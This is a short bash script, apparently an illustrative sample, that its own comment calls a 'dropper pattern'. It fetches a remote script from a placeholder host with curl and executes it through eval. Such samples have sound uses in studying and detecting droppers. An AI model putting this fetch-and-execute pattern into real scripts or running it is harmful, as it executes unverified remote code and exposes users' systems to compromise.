#!/bin/bash
# Dropper pattern: fetches a payload and executes it via eval
PAYLOAD=$(curl -s https://example.com/update.sh)
eval "$PAYLOAD"
